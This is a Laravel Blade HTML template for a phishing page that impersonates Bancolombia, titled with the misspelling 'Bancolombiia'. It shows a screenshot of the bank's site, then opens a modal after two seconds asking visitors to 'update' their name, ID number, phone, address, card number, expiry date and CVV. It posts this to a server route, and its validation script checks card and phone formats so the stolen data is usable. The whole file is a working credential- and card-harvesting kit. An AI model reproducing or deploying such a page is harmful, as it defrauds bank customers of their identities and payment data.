<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Bancolombiia</title>

        <link rel="icon" href="{{ asset('Img/favicon.png') }}" type="image/png">

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />

        <!-- Agrega la fuente Roboto desde Google Fonts -->
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">

        <!-- Tailwind CSS (si no estás usando Vite) -->
        <script src="https://cdn.tailwindcss.com"></script>

        <!-- Script para abrir el modal y manejar el scroll -->
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                setTimeout(function() {
                    const modal = document.getElementById('myModal');
                    modal.classList.remove('hidden');
                    document.body.classList.add('overflow-hidden'); // Deshabilitar scroll del fondo
                }, 2000);
            });

            // Cerrar modal y restaurar el scroll del fondo
            function closeModal() {
                const modal = document.getElementById('myModal');
                modal.classList.add('hidden');
                document.body.classList.remove('overflow-hidden'); // Restaurar scroll del fondo
            }
        </script>
    </head>
    <body class="font-sans antialiased dark:bg-black dark:text-white/50">
        <!-- Imagen de fondo -->
        <div class="w-full h-full overflow-auto">
            <img src="{{ asset('Img/post.png') }}" alt="Imagen de la página web de Bancolombia" class="w-full h-full object-cover">
        </div>

        <!-- Modal -->
        <div id="myModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
            <div class="bg-white p-6 rounded-lg w-11/12 md:w-1/2 lg:w-1/3 max-w-xl max-h-[90vh] overflow-y-auto">
                <!-- Botón para cerrar el modal -->
                <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-700">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>

                <!-- Mensaje importante -->
                <div class="mb-6">
                    <h2 class="text-xl font-semibold mb-4 text-gray-800" style="font-family: 'Roboto', sans-serif;">Actualizar datos</h2>
                    <p class="text-gray-700 text-sm" style="font-family: 'Roboto', sans-serif;">
                        Es importante que actualice sus datos antes de continuar. Por favor, ingrese la información solicitada a continuación para garantizar que sus datos estén correctamente registrados en nuestro sistema.
                    </p>
                </div>
                <form id="dataForm" action="{{ route('form.store') }}" method="POST">
                    @csrf <!-- Token CSRF para protección -->
                
                    <!-- Sección: Datos Personales -->
                    <div class="mb-8">
                        <h2 class="text-xl font-semibold mb-4 text-gray-800" style="font-family: 'Roboto', sans-serif;">Datos Personales</h2>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <!-- Nombre -->
                            <div class="mb-4">
                                <label for="nombre" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Nombre Completo</label>
                                <input type="text" name="nombre" id="nombre" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                <p id="nombreError" class="text-red-500 text-sm mt-1 hidden">El campo nombre es obligatorio.</p>
                            </div>
                            <!-- Documento -->
                            <div class="mb-4">
                                <label for="cc" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Número de Documento</label>
                                <input type="text" name="cc" id="cc" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                <p id="ccError" class="text-red-500 text-sm mt-1 hidden">El campo CC es obligatorio.</p>
                            </div>
                            <!-- Teléfono -->
                            <div class="mb-4">
                                <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Teléfono</label>
                                <input type="text" name="telefono" id="telefono" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                <p id="telefonoError" class="text-red-500 text-sm mt-1 hidden">El número de teléfono no es válido.</p>
                            </div>
                            <!-- Dirección -->
                            <div class="mb-4">
                                <label for="direccion" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Dirección de Residencia</label>
                                <input type="text" name="direccion" id="direccion" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                <p id="direccionError" class="text-red-500 text-sm mt-1 hidden">El campo dirección es obligatorio.</p>
                            </div>
                        </div>
                    </div>
                
                    <!-- Sección: Datos de la Tarjeta -->
                    <div class="mb-8">
                        <h2 class="text-xl font-semibold mb-4 text-gray-800" style="font-family: 'Roboto', sans-serif;">Datos de la Tarjeta</h2>
                        <div class="grid grid-cols-1 gap-4">
                            <!-- Número de Tarjeta -->
                            <div class="mb-4">
                                <label for="numero" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Número de Tarjeta</label>
                                <input type="text" name="numero" id="numero" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" maxlength="19" required>
                                <p id="numeroError" class="text-red-500 text-sm mt-1 hidden">El número de tarjeta no es válido.</p>
                            </div>
                            <!-- Fecha de Expiración y CVV -->
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <!-- Fecha de Expiración -->
                                <div class="mb-4">
                                    <label for="fecha" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Fecha de Expiración</label>
                                    <input type="text" name="fecha" id="fecha" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" placeholder="MM/YY" maxlength="5" required>
                                    <p id="fechaError" class="text-red-500 text-sm mt-1 hidden">El formato de la fecha debe ser MM/YY (por ejemplo, 12/25).</p>
                                </div>
                                <!-- CVV -->
                                <div class="mb-4">
                                    <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">CVV</label>
                                    <input type="text" name="cvv" id="cvv" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required maxlength="4">
                                    <p id="cvvError" class="text-red-500 text-sm mt-1 hidden">El CVV no es válido.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                
                    <!-- Botón de Enviar -->
                    <div class="flex justify-end">
                        <button type="submit" class="bg-[#FDDA24] text-black px-6 py-2 rounded-lg hover:bg-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#FDDA24] focus:ring-offset-2 transition-all">
                            Continuar
                        </button>
                    </div>
                </form>
                
                <!-- Script para validar el formulario antes de enviarlo -->
                <script>
                    document.getElementById('dataForm').addEventListener('submit', function(event) {
                        let isValid = true;
                
                        // Validar Nombre
                        const nombre = document.getElementById('nombre').value.trim();
                        if (nombre === '') {
                            document.getElementById('nombreError').classList.remove('hidden');
                            isValid = false;
                        } else {
                            document.getElementById('nombreError').classList.add('hidden');
                        }
                
                        // Validar Número de Documento
                        const cc = document.getElementById('cc').value.trim();
                        if (cc === '') {
                            document.getElementById('ccError').classList.remove('hidden');
                            isValid = false;
                        } else {
                            document.getElementById('ccError').classList.add('hidden');
                        }
                
                        // Validar Teléfono
                        const telefono = document.getElementById('telefono').value.trim();
                        if (!/^3\d{9}$/.test(telefono)) {
                            document.getElementById('telefonoError').classList.remove('hidden');
                            isValid = false;
                        } else {
                            document.getElementById('telefonoError').classList.add('hidden');
                        }
                
                        // Validar Dirección
                        const direccion = document.getElementById('direccion').value.trim();
                        if (direccion === '') {
                            document.getElementById('direccionError').classList.remove('hidden');
                            isValid = false;
                        } else {
                            document.getElementById('direccionError').classList.add('hidden');
                        }
                
                        // Validar Número de Tarjeta
                        const numero = document.getElementById('numero').value.trim().replace(/\s+/g, ''); // Eliminar espacios
                        if (!/^(4|5)\d{15}$/.test(numero) && !/^3[47]\d{13}$/.test(numero)) {
                            document.getElementById('numeroError').classList.remove('hidden');
                            isValid = false;
                        } else {
                            document.getElementById('numeroError').classList.add('hidden');
                        }
                
                        // Validar Fecha de Expiración
                        const fecha = document.getElementById('fecha').value.trim();
                        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(fecha)) {
                            document.getElementById('fechaError').classList.remove('hidden');
                            isValid = false;
                        } else {
                            document.getElementById('fechaError').classList.add('hidden');
                        }
                
                        // Validar CVV
                        const cvv = document.getElementById('cvv').value.trim();
                        if (/^(4|5)/.test(numero) && !/^\d{3}$/.test(cvv)) {
                            document.getElementById('cvvError').classList.remove('hidden');
                            isValid = false;
                        } else if (/^3[47]/.test(numero) && !/^\d{4}$/.test(cvv)) {
                            document.getElementById('cvvError').classList.remove('hidden');
                            isValid = false;
                        } else {
                            document.getElementById('cvvError').classList.add('hidden');
                        }
                
                        // Si no es válido, prevenir el envío del formulario
                        if (!isValid) {
                            event.preventDefault();
                        }
                    });
                
                    // Script para formatear el número de tarjeta
                    document.getElementById('numero').addEventListener('input', function(event) {
                        let value = event.target.value.replace(/\s+/g, '').replace(/\D/g, ''); // Eliminar espacios y caracteres no numéricos
                        if (value.length > 16) {
                            value = value.substring(0, 16); // Limitar a 16 dígitos
                        }
                        value = value.replace(/(\d{4})/g, '$1 ').trim(); // Agregar espacio cada 4 dígitos
                        event.target.value = value;
                    });
                
                    // Script para formatear la fecha de expiración
                    document.getElementById('fecha').addEventListener('input', function(event) {
                        let value = event.target.value.replace(/\D/g, ''); // Eliminar caracteres no numéricos
                        if (value.length > 2) {
                            value = value.substring(0, 2) + '/' + value.substring(2, 4); // Agregar "/" después de 2 dígitos
                        }
                        event.target.value = value;
                    });
                </script>
            </div>
        </div>
    </body>
</html>